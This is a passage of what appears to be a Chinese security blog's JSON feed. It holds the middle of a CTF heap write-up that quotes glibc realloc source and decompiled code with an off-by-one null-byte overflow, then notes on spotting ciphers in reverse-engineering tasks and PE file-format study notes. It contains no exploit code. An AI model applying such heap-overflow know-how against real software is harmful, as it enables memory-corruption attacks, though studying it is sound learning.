class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> *__libc_realloc (<span class=\"type\">void</span> *oldmem, <span class=\"type\">size_t</span> bytes)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  mstate ar_ptr;</span><br><span class=\"line\">  INTERNAL_SIZE_T nb;         <span class=\"comment\">/* padded request size */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">void</span> *newp;             <span class=\"comment\">/* chunk to return */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">void</span> *(*hook) (<span class=\"type\">void</span> *, <span class=\"type\">size_t</span>, <span class=\"type\">const</span> <span class=\"type\">void</span> *) =</span><br><span class=\"line\">    atomic_forced_read (__realloc_hook);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (__builtin_expect (hook != <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (*hook)(oldmem, bytes, RETURN_ADDRESS (<span class=\"number\">0</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> REALLOC_ZERO_BYTES_FREES</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (bytes == <span class=\"number\">0</span> &amp;&amp; oldmem != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      __libc_free (oldmem); <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* realloc of null is supposed to be same as malloc */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (oldmem == <span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> __libc_malloc (bytes);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* chunk corresponding to oldmem */</span></span><br><span class=\"line\">  <span class=\"type\">const</span> mchunkptr oldp = mem2chunk (oldmem);</span><br><span class=\"line\">  <span class=\"comment\">/* its size */</span></span><br><span class=\"line\">  <span class=\"type\">const</span> INTERNAL_SIZE_T oldsize = chunksize (oldp);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (chunk_is_mmapped (oldp))</span><br><span class=\"line\">    ar_ptr = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      MAYBE_INIT_TCACHE ();</span><br><span class=\"line\">      ar_ptr = arena_for_chunk (oldp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Little security check which won&#x27;t hurt performance: the allocator</span></span><br><span class=\"line\"><span class=\"comment\">     never wrapps around at the end of the address space.  Therefore</span></span><br><span class=\"line\"><span class=\"comment\">     we can exclude some size values which might appear here by</span></span><br><span class=\"line\"><span class=\"comment\">     accident or by &quot;design&quot; from some intruder.  We need to bypass</span></span><br><span class=\"line\"><span class=\"comment\">     this check for dumped fake mmap chunks from the old main arena</span></span><br><span class=\"line\"><span class=\"comment\">     because the new malloc may provide additional alignment.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((__builtin_expect ((<span class=\"type\">uintptr_t</span>) oldp &gt; (<span class=\"type\">uintptr_t</span>) -oldsize, <span class=\"number\">0</span>)</span><br><span class=\"line\">       || __builtin_expect (misaligned_chunk (oldp), <span class=\"number\">0</span>))</span><br><span class=\"line\">      &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (oldp))</span><br><span class=\"line\">      malloc_printerr (<span class=\"string\">&quot;realloc(): invalid pointer&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  checked_request2size (bytes, nb);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (chunk_is_mmapped (oldp))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* If this is a faked mmapped chunk from the dumped main arena,</span></span><br><span class=\"line\"><span class=\"comment\">\t always make a copy (and do not free the old chunk).  */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (DUMPED_MAIN_ARENA_CHUNK (oldp))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  <span class=\"comment\">/* Must alloc, copy, free. */</span></span><br><span class=\"line\">\t  <span class=\"type\">void</span> *newmem = __libc_malloc (bytes);</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (newmem == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t    <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t  <span class=\"comment\">/* Copy as many bytes as are available from the old chunk</span></span><br><span class=\"line\"><span class=\"comment\">\t     and fit into the new size.  NB: The overhead for faked</span></span><br><span class=\"line\"><span class=\"comment\">\t     mmapped chunks is only SIZE_SZ, not 2 * SIZE_SZ as for</span></span><br><span class=\"line\"><span class=\"comment\">\t     regular mmapped chunks.  */</span></span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (bytes &gt; oldsize - SIZE_SZ)</span><br><span class=\"line\">\t    bytes = oldsize - SIZE_SZ;</span><br><span class=\"line\">\t  <span class=\"built_in\">memcpy</span> (newmem, oldmem, bytes);</span><br><span class=\"line\">\t  <span class=\"keyword\">return</span> newmem;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"type\">void</span> *newmem;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> HAVE_MREMAP</span></span><br><span class=\"line\">      newp = mremap_chunk (oldp, nb);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (newp)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> chunk2mem (newp);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">      <span class=\"comment\">/* Note the extra SIZE_SZ overhead. */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (oldsize - SIZE_SZ &gt;= nb)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> oldmem;                         <span class=\"comment\">/* do nothing */</span></span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Must alloc, copy, free. */</span></span><br><span class=\"line\">      newmem = __libc_malloc (bytes);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (newmem == <span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;              <span class=\"comment\">/* propagate failure */</span></span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"built_in\">memcpy</span> (newmem, oldmem, oldsize - <span class=\"number\">2</span> * SIZE_SZ);</span><br><span class=\"line\">      munmap_chunk (oldp);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> newmem;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (SINGLE_THREAD_P)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class=\"line\">      assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||</span><br><span class=\"line\">\t      ar_ptr == arena_for_chunk (mem2chunk (newp)));</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">return</span> newp;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  __libc_lock_lock (ar_ptr-&gt;mutex);</span><br><span class=\"line\"></span><br><span class=\"line\">  newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class=\"line\"></span><br><span class=\"line\">  __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class=\"line\">  assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||</span><br><span class=\"line\">          ar_ptr == arena_for_chunk (mem2chunk (newp)));</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (newp == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* Try harder to allocate memory in other arenas.  */</span></span><br><span class=\"line\">      LIBC_PROBE (memory_realloc_retry, <span class=\"number\">2</span>, bytes, oldmem);</span><br><span class=\"line\">      newp = __libc_malloc (bytes);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (newp != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">memcpy</span> (newp, oldmem, oldsize - SIZE_SZ);</span><br><span class=\"line\">          _int_free (ar_ptr, oldp, <span class=\"number\">0</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> newp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_def (__libc_realloc)</span><br></pre></td></tr></table></figure>\n<p>大致意思就是如果 realloc (NULL,size) 就会调用 malloc。</p>\n<p>realloc (ptr,0)，调用 free。程序也是用这里实现的 free</p>\n<p>realloc (ptr,chunksize (ptr)), 不做任何事情。</p>\n<p>如果申请一个更大的空间，会检查当前堆块的附近是否有足够的空间，没有，则重新申请，然后将数据 copy 过去，并 free 原来的 chunk</p>\n<p>申小空间会将多余的空间释放掉。</p>\n<p>程序只允许我们存储两个 chunk 再 heap [2], 并且限制了我们的申请大小位 0x78。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">allocate</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  _BYTE *v0; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v2; <span class=\"comment\">// [rsp+0h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 size; <span class=\"comment\">// [rsp+8h] [rbp-18h]</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *v4; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index:&quot;</span>);</span><br><span class=\"line\">  v2 = read_long();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v2 &gt; <span class=\"number\">1</span> || heap[v2] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Invalid !&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size:&quot;</span>);</span><br><span class=\"line\">    size = read_long();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( size &lt;= <span class=\"number\">0x78</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v4 = <span class=\"built_in\">realloc</span>(<span class=\"number\">0LL</span>, size);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v4 )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        heap[v2] = v4;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Data:&quot;</span>);</span><br><span class=\"line\">        v0 = (_BYTE *)(heap[v2] + read_input(heap[v2], (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)size));\t\t<span class=\"comment\">//一字节溢出</span></span><br><span class=\"line\">        *v0 = <span class=\"number\">0</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;alloc error&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Too large!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">int</span>)v0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>allocate 函数里存在 off_by_one 的 null 溢出。</p>\n<p>程序并没有输出的功能。</p>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/05/12/%E9%80%86%E5%90%91%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/",
            "url": "http://example.com/2022/05/12/%E9%80%86%E5%90%91%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/",
            "title": "逆向常见算法",
            "date_published": "2022-05-12T10:58:05.000Z",
            "content_html": "<h1 id=\"reverse-常见的加密算法\"><a class=\"markdownIt-Anchor\" href=\"#reverse-常见的加密算法\">#</a> Reverse \t常见的加密算法</h1>\n<p>在 reverse 的题目中，常常会对我们的输入以及内存数据进行加密，然后与已有的密文进行对比，从而判断我们的输入是否正确</p>\n<h2 id=\"基于特征值识别的加密算法desaest系列md5sm4\"><a class=\"markdownIt-Anchor\" href=\"#基于特征值识别的加密算法desaest系列md5sm4\">#</a> 基于特征值识别的加密算法：DES，AES，T 系列，md5,sm4</h2>\n<p>ida pro 插件</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BvbHltb3JmL2ZpbmRjcnB5dC15YXJh\">https://github.com/polymorf/findcrpyt-yara</span></p>\n<h3 id=\"t系列\"><a class=\"markdownIt-Anchor\" href=\"#t系列\">#</a> T 系列</h3>\n<h4 id=\"teaxteaxxtea\"><a class=\"markdownIt-Anchor\" href=\"#teaxteaxxtea\">#</a> TEA，XTEA，XXTEA</h4>\n<p>有一个明确的特征值，然后对明文进行一些基本的算数运算</p>\n<h3 id=\"aes块加密算法\"><a class=\"markdownIt-Anchor\" href=\"#aes块加密算法\">#</a> AES—— 块加密算法</h3>\n<p>有一个固定的 256 字节的数组</p>\n<p>sbox [256] 的数组（用于矩阵运算的密钥）, 但是密钥不一定在程序中定义，可能是通过算法函数生成。这里也是出题人常用的出题思路 —— 修改 sbox。</p>\n<p>AES 基于单个块的加密，一次处理 4 个字节的数据</p>\n<h3 id=\"rc4\"><a class=\"markdownIt-Anchor\" href=\"#rc4\">#</a> RC4</h3>\n<p>通过一个 key，生成一个 sbox，再由 sbox 生成一个 keystream，明文与 keystream 亦或得到明文</p>\n<h3 id=\"md5\"><a class=\"markdownIt-Anchor\" href=\"#md5\">#</a> MD5</h3>\n<p>有 4 个固定的 32bit 的值</p>\n<h3 id=\"sm4\"><a class=\"markdownIt-Anchor\" href=\"#sm4\">#</a> SM4</h3>\n<p>有一个固定的 256 字节的数组</p>\n<h3 id=\"des\"><a class=\"markdownIt-Anchor\" href=\"#des\">#</a> DES</h3>\n<p>有一个固定的 64 字节的数组</p>\n<h3 id=\"第三方库加密\"><a class=\"markdownIt-Anchor\" href=\"#第三方库加密\">#</a> 第三方库加密</h3>\n<p>调用第三方的库函数，对数据进行加密。这时候我们需要去寻找对应的加密函数的调用信息，dll，so 文件提供的 api。也有可能是使用的网络上开源的加密算法。</p>\n<h2 id=\"加密算法的模式\"><a class=\"markdownIt-Anchor\" href=\"#加密算法的模式\">#</a> 加密算法的模式</h2>\n<h3 id=\"分组加密模式12常用\"><a class=\"markdownIt-Anchor\" href=\"#分组加密模式12常用\">#</a> 分组加密模式（1，2 常用）</h3>\n<h4 id=\"1电码本模式ecb\"><a class=\"markdownIt-Anchor\" href=\"#1电码本模式ecb\">#</a> 1，电码本模式 ecb</h4>\n<p>将明文分成多个块，对每个块进行单独的加密，然后拼接成密文，解密的流程就是将加密快换成解密块</p>\n<h4 id=\"2密码分组链接模式cbc\"><a class=\"markdownIt-Anchor\" href=\"#2密码分组链接模式cbc\">#</a> 2，密码分组链接模式 CBC</h4>\n<p>将明文分组程多个明文块 plaintext，算法需要两个额外的值，initialization Vector (IV), 这是一个与明文块大小相同的数据块，用于与第一个 plaintext 进行亦或（初始化），得到中间的块，Block Cipher Encryption，然后 BCE 与 key 进行加密运算的带第一个密文块，Ciphertext。后面按照同样的流程，只不过不再是使用给出的 IV，而是将上一个密文块用作本次加密的 IV。</p>\n<h4 id=\"3计算器模式ctr\"><a class=\"markdownIt-Anchor\" href=\"#3计算器模式ctr\">#</a> 3，计算器模式 CTR</h4>\n<h4 id=\"4密码反馈模式cfb\"><a class=\"markdownIt-Anchor\" href=\"#4密码反馈模式cfb\">#</a> 4，密码反馈模式 CFB</h4>\n<h4 id=\"5输出反馈模式ofb\"><a class=\"markdownIt-Anchor\" href=\"#5输出反馈模式ofb\">#</a> 5，输出反馈模式 OFB</h4>\n",
            "tags": [
                "reverse"
            ]
        },
        {
            "id": "http://example.com/2022/05/12/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
            "url": "http://example.com/2022/05/12/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
            "title": "滴水逆向_学习笔记",
            "date_published": "2022-05-12T02:10:58.000Z",
            "content_html": "<h1 id=\"20220512开始加速学习逆向以滴水逆向的教程为路线\"><a class=\"markdownIt-Anchor\" href=\"#20220512开始加速学习逆向以滴水逆向的教程为路线\">#</a> 20220512 开始加速学习逆向，以滴水逆向的教程为路线。</h1>\n<p>下面的内容基于 32 位 pe 程序</p>\n<h2 id=\"1进制\"><a class=\"markdownIt-Anchor\" href=\"#1进制\">#</a> 1，进制</h2>\n<p>8 进制的 2-3.（32 位）</p>\n<p>010 - 011</p>\n<p>补码加法：0000 0000 0000 0000 0000 0000 0000 0010 +  1111 1111 1111 1111 1111 1111 1111 1101</p>\n<p>结果 17777777777…(8)</p>\n<h2 id=\"2exe执行文件如何执行程序\"><a class=\"markdownIt-Anchor\" href=\"#2exe执行文件如何执行程序\">#</a> 2，EXE 执行文件如何执行程序</h2>\n<p><img data-src=\"https://img-blog.csdnimg.cn/e9028542f2504e34b2dbe6706c8cbd79.png\" alt=\"img\"></p>\n<p>什么是程序。什么是数据</p>\n<p>程序是数据与可执行代码的组合。</p>\n<p>PE 文件结构</p>\n<h3 id=\"dos头\"><a class=\"markdownIt-Anchor\" href=\"#dos头\">#</a> dos 头</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_DOS_HEADER</span> &#123;</span>      <span class=\"comment\">// DOS .EXE header</span></span><br><span class=\"line\">    WORD   e_magic;                     <span class=\"comment\">// Magic number</span></span><br><span class=\"line\">    WORD   e_cblp;                      <span class=\"comment\">// Bytes on last page of file</span></span><br><span class=\"line\">    WORD   e_cp;                        <span class=\"comment\">// Pages in file</span></span><br><span class=\"line\">    WORD   e_crlc;                      <span class=\"comment\">// Relocations</span></span><br><span class=\"line\">    WORD   e_cparhdr;                   <span class=\"comment\">// Size of header in paragraphs</span></span><br><span class=\"line\">    WORD   e_minalloc;                  <span class=\"comment\">// Minimum extra paragraphs needed</span></span><br><span class=\"line\">    WORD   e_maxalloc;                  <span class=\"comment\">// Maximum extra paragraphs needed</span></span><br><span class=\"line\">    WORD   e_ss;                        <span class=\"comment\">// Initial (relative) SS value</span></span><br><span class=\"line\">    WORD   e_sp;                        <span class=\"comment\">// Initial SP value</span></span><br><span class=\"line\">    WORD   e_csum;                      <span class=\"comment\">// Checksum</span></span><br><span class=\"line\">    WORD   e_ip;                        <span class=\"comment\">// Initial IP value</span></span><br><span class=\"line\">    WORD   e_cs;                        <span class=\"comment\">// Initial (relative) CS value</span></span><br><span class=\"line\">    WORD   e_lfarlc;                    <span class=\"comment\">// File address of relocation table</span></span><br><span class=\"line\">    WORD   e_ovno;                      <span class=\"comment\">// Overlay number</span></span><br><span class=\"line\">    WORD   e_res[<span class=\"number\">4</span>];                    <span class=\"comment\">// Reserved words</span></span><br><span class=\"line\">    WORD   e_oemid;                     <span class=\"comment\">// OEM identifier (for e_oeminfo)</span></span><br><span class=\"line\">    WORD   e_oeminfo;                   <span class=\"comment\">// OEM information; e_oemid specific</span></span><br><span class=\"line\">    WORD   e_res2[<span class=\"number\">10</span>];                  <span class=\"comment\">// Reserved words</span></span><br><span class=\"line\">    DWORD   e_lfanew;                    <span class=\"comment\">// File address of new exe header\t0x3c</span></span><br><span class=\"line\">&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>DOS 头目前已经没有什么作用了，保留的目的是为了向下兼容 16 位程序</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220512103830333.png\" alt=\"image-20220512103830333\"></p>\n<p>0x3c 地址的数据是 0x000000d8,（windows 中，高地址在前。）这里指向的是数据存储的起点，但不是程序入口。这里指向的是 PE</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">iMAGE_NT_HEADERS</span>&#123;</span></span><br><span class=\"line\"><span class=\"number\">0x00</span>\tDWORD Signature</span><br><span class=\"line\"><span class=\"number\">0x04</span>\t_iMAGE_FILE_HEADER FileHeader</span><br><span class=\"line\"><span class=\"number\">0x18</span>\t_iMAGE_OPTIONAL_HEADER OptionalHeader</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"程序入口\"><a class=\"markdownIt-Anchor\" href=\"#程序入口\">#</a> 程序入口</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class=\"line\">  WORD                 Magic;</span><br><span class=\"line\">  BYTE                 MajorLinkerVersion;</span><br><span class=\"line\">  BYTE                 MinorLinkerVersion;</span><br><span class=\"line\">  DWORD                SizeOfCode;</span><br><span class=\"line\">  DWORD                SizeOfInitializedData;</span><br><span class=\"line\">  DWORD                SizeOfUninitializedData;</span><br><span class=\"line\">  DWORD                AddressOfEntryPoint;\t\t\t<span class=\"comment\">//入口点</span></span><br><span class=\"line\">  DWORD                BaseOfCode;\t\t\t\t\t<span class=\"comment\">//代码基址</span></span><br><span class=\"line\">  DWORD                BaseOfData;\t\t\t\t\t<span class=\"comment\">//数据基址</span></span><br><span class=\"line\">  DWORD                ImageBase;\t\t\t\t\t<span class=\"comment\">//镜像基址</span></span><br><span class=\"line\">  DWORD                SectionAlignment;</span><br><span class=\"line\">  DWORD                FileAlignment;</span><br><span class=\"line\">  WORD                 MajorOperatingSystemVersion;</span><br><span class=\"line\">  WORD                 MinorOperatingSystemVersion;</span><br><span class=\"line\">  WORD                 MajorImageVersion;</span><br><span class=\"line\">  WORD                 MinorImageVersion;</span><br><span class=\"line\">  WORD                 MajorSubsystemVersion;</span><br><span class=\"line\">  WORD                 MinorSubsystemVersion;</span><br><span class=\"line\">  DWORD                Win32VersionValue;</span><br><span class=\"line\">  DWORD                SizeOfImage;</span><br><span class=\"line\">  DWORD                SizeOfHeaders;</span><br><span class=\"line\">  DWORD                CheckSum;</span><br><span class=\"line\">  WORD                 Subsystem;</span><br><span class=\"line\">  WORD                 DllCharacteristics;</span><br><span class=\"line\">  DWORD                SizeOfStackReserve;</span><br><span class=\"line\">  DWORD                SizeOfStackCommit;</span><br><span class=\"line\">  DWORD                SizeOfHeapReserve;</span><br><span class=\"line\">  DWORD                SizeOfHeapCommit;</span><br><span class=\"line\">  DWORD                LoaderFlags;</span><br><span class=\"line\">  DWORD                NumberOfRvaAndSizes;</span><br><span class=\"line\">  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class=\"line\">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure>\n<p><em>iMAGE_OPTIONAL_HEADER OptionalHeader   结构体紧跟在</em>    iMAGE_NT_HEADERS 的后面。</p>\n<p>AddressOfEntryPoint 在结构体中的偏移是 0x10,</p>\n<p>上面的截图为例，入口点在 0x100h，数据是 0x00001307</p>\n<p>代码基址是 0x00001000, 数据段基址 0x00006000。这里我们通过 ida 分析发现，</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:<span class=\"number\">00401000</span> ;</span><br><span class=\"line\">.text:<span class=\"number\">00401000</span> ; +-------------------------------------------------------------------------+</span><br><span class=\"line\">.text:<span class=\"number\">00401000</span> ; |      This file was generated by The Interactive <span class=\"title 